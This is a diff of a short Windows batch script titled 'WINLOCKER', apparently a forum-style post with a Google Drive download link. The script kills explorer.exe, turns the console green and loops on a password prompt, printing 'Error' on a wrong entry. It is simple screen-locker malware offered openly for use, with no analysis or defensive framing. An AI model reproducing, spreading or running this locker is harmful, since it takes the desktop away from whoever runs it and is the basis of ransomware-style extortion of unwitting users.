@@ -1,3 +1,8 @@
+WINLOCKER
+Batch-file.
+
+Code:
+
 @echo off
 taskkill /im explorer.exe /f >nul         //процесс который завершается перед открытием консоли
 color a
@@ -16,3 +21,6 @@ echo Error
 echo Enter Pass
 )
 goto h
+
+
+Download bath-file: https://drive.google.com/file/d/12Jw0GZSuJMOHGKUSHuhzU7IYLfNsdbo2/view?usp=sharing
